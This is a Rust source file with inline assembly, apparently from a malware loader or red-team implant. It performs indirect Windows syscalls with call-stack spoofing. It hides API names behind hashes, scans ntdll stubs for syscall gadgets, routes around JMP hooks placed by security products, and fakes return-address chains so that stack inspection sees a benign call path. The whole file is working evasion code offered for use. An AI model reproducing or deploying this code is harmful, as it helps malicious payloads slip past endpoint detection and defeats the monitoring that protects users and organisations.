use std::arch::global_asm;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::OnceLock;

use winapi::shared::ntdef::{HANDLE, LARGE_INTEGER, NTSTATUS, PVOID};

use crate::hash::fnv1a_hash;



use crate::ssn_resolver::resolve_ssn_by_hash;

const H_NT_FLUSH_INSTRUCTION_CACHE: u64 = fnv1a_hash(b"NtFlushInstructionCache");
const H_NT_DELAY_EXECUTION: u64 = fnv1a_hash(b"NtDelayExecution");

const STATUS_UNSUCCESSFUL: i32 = 0xC0000001u32 as i32;

#[inline]
pub(crate) unsafe fn find_stub_gadget(stub_addr: *const u8) -> Option<u64> {
    if stub_addr.is_null() {
        return None;
    }

    let b0 = *stub_addr;
    let b1 = *stub_addr.add(1);
    let b2 = *stub_addr.add(2);

    let is_normal_or_hooked_stub = b0 == 0x4C && b1 == 0x8B && b2 == 0xD1; // mov r10, rcx
    let is_jmp_hook = b0 == 0xE9;                                          // JMP rel32
    let is_jmp_indirect = b0 == 0xFF && b1 == 0x25;                        // JMP [rip+disp32]

    if !is_normal_or_hooked_stub && !is_jmp_hook && !is_jmp_indirect {
        
        return None;
    }


    const KNOWN_OFFSETS: [usize; 5] = [
        0x12, 
        0x11, 
        0x0F, 
        0x14, 
        0x08, 
    ];

    for &off in &KNOWN_OFFSETS {
        let p = stub_addr.add(off);
        
        let b0 = *p;
        let b1 = *p.add(1);
        let b2 = *p.add(2);
        if b0 == 0x0F && b1 == 0x05 && b2 == 0xC3 {
            return Some(p as u64);
        }
    }


    for off in (0x16..0x20).step_by(2) {
        let p = stub_addr.add(off);
        let b0 = *p;
        let b1 = *p.add(1);
        let b2 = *p.add(2);
        if b0 == 0x0F && b1 == 0x05 && b2 == 0xC3 {
            return Some(p as u64);
        }
    }

    None
}


#[inline]
pub(crate) unsafe fn select_gadget_for_stub(stub_addr: *const u8) -> u64 {

    if let Some(addr) = find_stub_gadget(stub_addr) {
        crate::debug_log!("[GADGET] Stub-specific: 0x{:X}", addr);
        return addr;
    }

    crate::debug_log!(
        "[GADGET] Stub at 0x{:X} hooked, fallback pool",
        stub_addr as u64
    );
    get_rotated_syscall_gadget()
}

global_asm!(
    r#"
.section .text
.global indirect_syscall_spoofed
.global asm_get_peb
.global asm_get_teb
.align 16

indirect_syscall_spoofed:
    
    push rbx
    push rbp
    push rdi
    push rsi
    push r12
    push r13
    push r14
    push r15
    

    sub rsp, 0x200
    sub rsp, 0x1B8

    cld
    
    mov rsi, rsp
    
    movzx r13d, cx      // SSN -> R13D
    mov r12, rdx        // Gadget -> R12
    mov r14, r8         // ChainPtr -> R14
    mov r15, r9         // arg1 -> R15
    
    test r14, r14
    jnz .L_spoof_valid
    mov eax, 0xC0000001
    jmp .L_epilogue
.L_spoof_valid:


    mov [rsp + 0x360], rbp


    mov rdi, rsp
    add rdi, 0x60              

    
    mov rax, [r14 + 136]
    test rax, rax
    jz .L_zero_fill_fallback   // seed=0 

    mov ecx, 96                

.L_context_fill:

    mov r11, rax
    shl r11, 13
    xor rax, r11
    mov r11, rax
    shr r11, 7
    xor rax, r11
    mov r11, rax
    shl r11, 17
    xor rax, r11


    mov r10d, ecx
    and r10d, 3
    mov r8, [r14 + 104 + r10*8]   // context_bases[r10d]


    mov r9, rax
    and r9d, 0xFFFFF             
    add r8, r9                   


    mov [rdi], r8
    add rdi, 8

    dec ecx
    jnz .L_context_fill
    jmp .L_fill_done

.L_zero_fill_fallback:

    xor eax, eax
    mov ecx, 96
    rep stosq

.L_fill_done:
    


    mov rbx, [r14 + 96]
    test rbx, rbx
    jz .L_no_frames
    cmp rbx, 8
    jbe .L_depth_valid
    mov rbx, 8
.L_depth_valid:

    
    lea rdi, [rsp + 0x60]     
    xor rcx, rcx              // frame index = 0
    xor r11, r11              // cumulative offset = 0
    
.L_frame_loop:
    
    lea rax, [rdi + r11]      // current frame start
    
    
    // return_addrs[rcx] = [r14 + rcx*8]
    mov r10, rcx
    shl r10, 3                // r10 = rcx * 8
    mov r10, [r14 + r10]      // r10 = return_addrs[rcx]
    
    // frame_sizes[rcx] = [r14 + 64 + rcx*4]
    mov r9, rcx
    shl r9, 2                 // r9 = rcx * 4
    mov r9d, [r14 + 64 + r9]  // r9d = frame_sizes[rcx] (u32)

    cmp r9d, 0x28
    jae .L_size_ok
    mov r9d, 0x28
.L_size_ok:
    cmp r9d, 0xB0
    jbe .L_size_cap_ok
    mov r9d, 0xB0
.L_size_cap_ok:
    
    // return_addr at [frame_start + frame_size - 8]
    lea r8, [rax + r9 - 8]
    mov [r8], r10
    

    add r11, r9               // cumulative += frame_size
    

    mov r10, rcx
    inc r10
    cmp r10, rbx              
    jae .L_last_frame
    

    lea r10, [rdi + r11]
    mov [rax], r10
    jmp .L_frame_continue
    
.L_last_frame:

    mov qword ptr [rax], 0
    
.L_frame_continue:
    inc rcx
    cmp rcx, rbx
    jb .L_frame_loop
    
.L_no_frames:

    lea rbp, [rsp + 0x60]

    xor rax, rax
    mov [rsp + 0x20], rax
    mov [rsp + 0x28], rax
    mov [rsp + 0x30], rax
    mov [rsp + 0x38], rax
    mov [rsp + 0x40], rax
    mov [rsp + 0x48], rax
    mov [rsp + 0x50], rax
    mov [rsp + 0x58], rax


    // RSP0 = RSP2 + 0x3B8 + 0x40 = RSP2 + 0x3F8
    // arg2 at [RSP2 + 0x3F8 + 0x28] = [RSP2 + 0x420]
    mov r10, r15                    // arg1 -> R10 (rcx)
    mov rdx, [rsp + 0x420]          // arg2 -> RDX
    mov r8, [rsp + 0x428]           // arg3 -> R8
    mov r9, [rsp + 0x430]           // arg4 -> R9
    
    mov r11, [rsp + 0x438]          // arg5
    mov [rsp + 0x20], r11
    mov r11, [rsp + 0x440]          // arg6
    mov [rsp + 0x28], r11
    mov r11, [rsp + 0x448]          // arg7
    mov [rsp + 0x30], r11
    mov r11, [rsp + 0x450]          // arg8
    mov [rsp + 0x38], r11
    mov r11, [rsp + 0x458]          // arg9
    mov [rsp + 0x40], r11
    mov r11, [rsp + 0x460]          // arg10
    mov [rsp + 0x48], r11
    mov r11, [rsp + 0x468]          // arg11
    mov [rsp + 0x50], r11
    

    mov rbx, r12        // RBX = Gadget
    mov eax, r13d       // EAX = SSN
    call rbx            // CET-safe indirect call

    
.L_epilogue:

    mov rbp, [rsp + 0x360]
    mov rsp, rsi

    add rsp, 0x1B8
    add rsp, 0x200
    pop r15
    pop r14
    pop r13
    pop r12
    pop rsi
    pop rdi
    pop rbp
    pop rbx
    ret


.align 16
asm_get_peb:
    mov rax, gs:[0x60]
    ret

.align 16
asm_get_teb:
    mov rax, gs:[0x30]
    ret
"#
);

extern "C" {

    pub(crate) fn indirect_syscall_spoofed(
        ssn: u16,
        syscall_addr: u64,
        spoof_ret_addr: u64,
        arg1: u64,
        arg2: u64,
        arg3: u64,
        arg4: u64,
        arg5: u64,
        arg6: u64,
        arg7: u64,
        arg8: u64,
        arg9: u64,
        arg10: u64,
        arg11: u64,
    ) -> NTSTATUS;
}

pub(crate) struct SyscallAddr {
    pub addr: AtomicU64,
}

impl SyscallAddr {
    pub(crate) const fn new() -> Self {
        SyscallAddr {
            addr: AtomicU64::new(0),
        }
    }
}

impl Default for SyscallAddr {
    fn default() -> Self {
        Self::new()
    }
}

static SYSCALL_GADGETS: [SyscallAddr; 8] = [
    SyscallAddr::new(),
    SyscallAddr::new(),
    SyscallAddr::new(),
    SyscallAddr::new(),
    SyscallAddr::new(),
    SyscallAddr::new(),
    SyscallAddr::new(),
    SyscallAddr::new(),
];

static SYSCALL_GADGETS_READY: OnceLock<bool> = OnceLock::new();

pub(crate) unsafe fn ensure_syscall_gadgets() -> bool {
    if SYSCALL_GADGETS[0].addr.load(Ordering::Relaxed) != 0 {
        return true;
    }


    const TARGET_EXPORTS: &[u64] = &[
        fnv1a_hash(b"NtClose"),
        fnv1a_hash(b"NtWaitForSingleObject"),
        fnv1a_hash(b"NtAllocateVirtualMemory"),
        fnv1a_hash(b"NtFreeVirtualMemory"),
        fnv1a_hash(b"NtQueryVirtualMemory"),
        fnv1a_hash(b"NtProtectVirtualMemory"),
        fnv1a_hash(b"NtDelayExecution"),
    ];

    let mut slot_idx = 0usize;
    for &h in TARGET_EXPORTS.iter() {
        if slot_idx >= SYSCALL_GADGETS.len() {
            break;
        }
        if let Some((_ssn, stub)) = resolve_ssn_by_hash(h) {
            
            if let Some(addr) = find_stub_gadget(stub) {
                let already_stored = SYSCALL_GADGETS[..slot_idx]
                    .iter()
                    .any(|g| crate::stack_spoof::pool_load(&g.addr) == addr);
                if !already_stored {
                    crate::stack_spoof::pool_store(&SYSCALL_GADGETS[slot_idx].addr, addr);
                    slot_idx += 1;
                }
            }
        }
    }

    if slot_idx > 0 {
        SYSCALL_GADGETS_READY.get_or_init(|| true);
        return true;
    }

    false
}

#[inline]
pub(crate) fn get_rotated_syscall_gadget() -> u64 {
    #[inline(always)]
    fn validate_gadget(addr: u64) -> bool {
        if addr == 0 {
            return false;
        }
        unsafe {
            let ptr = addr as *const u8;
            // syscall = 0F 05
            let b0 = core::ptr::read_volatile(ptr);
            let b1 = core::ptr::read_volatile(ptr.add(1));
            b0 == 0x0F && b1 == 0x05
        }
    }

    if crate::stack_spoof::is_initialized() {
        let gadget = crate::stack_spoof::get_random_syscall_gadget();
        if validate_gadget(gadget) {
            return gadget;
        }

        crate::debug_log!("[GADGET] stack_spoof gadget invalid; using fallback");
    }

    unsafe {
        ensure_syscall_gadgets();
    }

    let gadget_idx = crate::stack_spoof::random_index(8);
    let fallback = crate::stack_spoof::pool_load(&SYSCALL_GADGETS[gadget_idx].addr);

    if validate_gadget(fallback) {
        return fallback;
    }

    for (i, gadget) in SYSCALL_GADGETS.iter().enumerate() {
        if i == gadget_idx {
            continue;
        }
        let alt = crate::stack_spoof::pool_load(&gadget.addr);
        if validate_gadget(alt) {
            return alt;
        }
    }

    crate::debug_log!("[GADGET] All gadgets invalid; rescanning");
    unsafe {
        for gadget in &SYSCALL_GADGETS {
            gadget.addr.store(0, Ordering::Release);
        }
        ensure_syscall_gadgets();
    }
    let rescanned = crate::stack_spoof::pool_load(&SYSCALL_GADGETS[0].addr);

    if validate_gadget(rescanned) {
        return rescanned;
    }

    crate::debug_log!("[GADGET] No valid gadget found");
    0
}

pub(crate) fn init_stack_spoofing() -> bool {
    unsafe {
        
        if let Some(_ntdll) = crate::hash::get_module_by_hash(crate::hash::H_NTDLL) {
            crate::debug_log!("[INIT] ntdll base: 0x{:X}", _ntdll as usize);
        }
        if let Some(_k32) = crate::hash::get_module_by_hash(crate::hash::H_KERNEL32) {
            crate::debug_log!("[INIT] kernel32 base: 0x{:X}", _k32 as usize);
        }
        if let Some(_kb) = crate::hash::get_module_by_hash(crate::hash::H_KERNELBASE) {
            crate::debug_log!("[INIT] kernelbase base: 0x{:X}", _kb as usize);
        }

        let result = crate::stack_spoof::init_gadget_pools();
        if result {
            crate::debug_log!(
                "[SPOOF] Initialized: {} syscall gadgets, {} return addrs",
                crate::stack_spoof::syscall_gadget_count(),
                crate::stack_spoof::return_address_count()
            );
        } else {
            crate::debug_log!("[SPOOF] Initialization failed; fallback will be used");
        }
        result
    }
}

#[inline(never)]

pub(crate) unsafe fn nt_flush_instruction_cache(
    process: HANDLE,
    base_address: PVOID,
    size: usize,
) -> NTSTATUS {
    let (ssn, stub) = match resolve_ssn_by_hash(H_NT_FLUSH_INSTRUCTION_CACHE) {
        Some(s) => s,
        None => return STATUS_UNSUCCESSFUL,
    };

    let syscall_addr = select_gadget_for_stub(stub);
    if syscall_addr == 0 {
        return STATUS_UNSUCCESSFUL;
    }

    let chain = crate::stack_spoof::build_zero_depth_chain();
    let chain_ptr = &chain as *const crate::stack_spoof::SyntheticChain as u64;

    indirect_syscall_spoofed(
        ssn,
        syscall_addr,
        chain_ptr,
        process as u64,
        base_address as u64,
        size as u64,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    )
}

#[inline(never)]

pub(crate) unsafe fn nt_delay_execution(alertable: u8, delay_interval: *const LARGE_INTEGER) -> NTSTATUS {
    let (ssn, stub) = match resolve_ssn_by_hash(H_NT_DELAY_EXECUTION) {
        Some(s) => s,
        None => return STATUS_UNSUCCESSFUL,
    };

    let syscall_addr = select_gadget_for_stub(stub);
    if syscall_addr == 0 {
        return STATUS_UNSUCCESSFUL;
    }

    let chain = crate::stack_spoof::build_zero_depth_chain();
    let chain_ptr = &chain as *const crate::stack_spoof::SyntheticChain as u64;

    indirect_syscall_spoofed(
        ssn,
        syscall_addr,
        chain_ptr,
        alertable as u64,
        delay_interval as u64,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    )
}
